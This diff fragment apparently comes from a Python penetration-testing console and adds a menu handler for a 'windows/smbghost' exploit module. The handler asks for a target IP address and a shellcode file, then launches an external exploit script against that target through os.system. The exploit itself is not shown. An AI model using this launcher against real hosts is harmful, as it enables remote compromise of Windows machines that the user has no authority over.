+        time.sleep(0.5)
+        Console()
+    elif scconsole175 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def windowssmbghost():
+    scconsole176 = input("sc~" + color.red + "(windows/smbghost)" + color.white + ">")
+    if scconsole176 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        windowssmbghost()
+    elif scconsole176 == "clear":
+        os.system('clear')
+        windowssmbghost()
+    elif scconsole176 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify target ip address.
+SHELLCODE        | after you generated your shellcode, paste into a .txt file, then give it to exploit.
+
+you will specifiy these options when you run or exploit it!
+""")
+        windowssmbghost()
+    elif scconsole176 == "run" or scconsole176 == "exploit":
+        targetsmb = input("Enter target IP Address: ")
+        shellcodefile = input("Specify the ShellCode file (example: shellcode.txt): ")
+        os.system(f'python exploits/windows/smbghost.py {targetsmb} {shellcodefile}')
+        windowssmbghost()
+    elif scconsole176 == "unuse":
+        print("unusing windows/smbghost.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole176 == "exit":
         exit()
     else:
         print("There is no command or option like that!\nunusing ...")
